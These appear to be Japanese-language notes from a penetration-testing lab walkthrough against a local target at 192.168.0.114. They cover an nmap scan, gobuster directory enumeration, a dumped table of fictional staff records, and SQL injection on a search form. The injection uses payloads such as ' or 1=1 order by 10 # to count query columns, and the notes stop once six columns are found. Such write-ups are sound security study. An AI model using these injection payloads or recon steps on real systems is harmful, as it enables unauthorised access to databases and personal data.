〇サービス列挙

nmap -p- 192.168.0.114

![[Service Enumeration image.png]]

・サービス詳細

![[Service Enumeration image 1.png]]

Webの調査①

・gobuster dir -u http://192.168.0.114 -w /usr/share/wordlists/dirb/common.txt

![[Service Enumeration image 2.png]]

Webの調査②

〇ブラウザ調査

![[Service Enumeration image 3.png]]

![[Service Enumeration image 4.png]]

==🔴・====🔴Display All Records==

**==🔴Display all user information==**

ID: 1

Name: Mary Moe

Position: CEO

Phone No: 46478415155456

Email: marym@example.com

ID: 2

Name: Julie Dooley

Position: Human Resources

Phone No: 46457131654

Email: julied@example.com

ID: 3

Name: Fred Flintstone

Position: Systems Administrator

Phone No: 46415323

Email: fredf@example.com

ID: 4

Name: Barney Rubble

Position: Help Desk

Phone No: 324643564

Email: barneyr@example.com

ID: 5

Name: Tom Cat

Position: Driver

Phone No: 802438797

Email: tomc@example.com

ID: 6

Name: Jerry Mouse

Position: Stores

Phone No: 24342654756

Email: jerrym@example.com

ID: 7

Name: Wilma Flintstone

Position: Accounts

Phone No: 243457487

Email: wilmaf@example.com

ID: 8

Name: Betty Rubble

Position: Junior Accounts

Phone No: 90239724378

Email: bettyr@example.com

ID: 9

Name: Chandler Bing

Position: President - Sales

Phone No: 189024789

Email: chandlerb@example.com

ID: 10

Name: Joey Tribbiani

Position: Janitor

Phone No: 232131654

Email: joeyt@example.com

ID: 11

Name: Rachel Green

Position: Personal Assistant

Phone No: 823897243978

Email: rachelg@example.com

ID: 12

Name: Ross Geller

Position: Instructor

Phone No: 6549638203

Email: rossg@example.com

ID: 13

Name: Monica Geller

Position: Marketing

Phone No: 8092432798

Email: monicag@example.com

ID: 14

Name: Phoebe Buffay

Position: Assistant Janitor

Phone No: 43289079824

Email: phoebeb@example.com

ID: 15

Name: Scooter McScoots

Position: Resident Cat

Phone No: 454786464

Email: scoots@example.com

ID: 16

Name: Donald Trump

Position: Replacement Janitor

Phone No: 65464646479741

Email: janitor@example.com

ID: 17

Name: Scott Morrison

Position: Assistant Replacement Janitor

Phone No: 47836546413

Email: janitor2@example.com

データベースの調査

・Search

![[Service Enumeration image 5.png]]

・Manage

SQLインジェクションが通るかテスト

![[Service Enumeration image 6.png]]

失敗

・Search画面でもテスト

![[Service Enumeration image 7.png]]

成功

・カラム数の特定

![[Service Enumeration image 8.png]]

表示されている画像からSearchで生成されるクエリは以下のようではないかと予想

select id, name, position, phone, email from table where name="{input}"

そこで具体的なテーブル内のカラム数を調べていく

１０以上あるかどうか

' or 1=1 order by 10 #

![[Service Enumeration image 9.png]]

結果

![[Service Enumeration image 10.png]]

１０以上は無い

同様のやり方で一つずつ減らしていく

' or 1=1 order by 9 #

・・・

' or 1=1 order by 6 #

成功

カラム数が６はあることが判明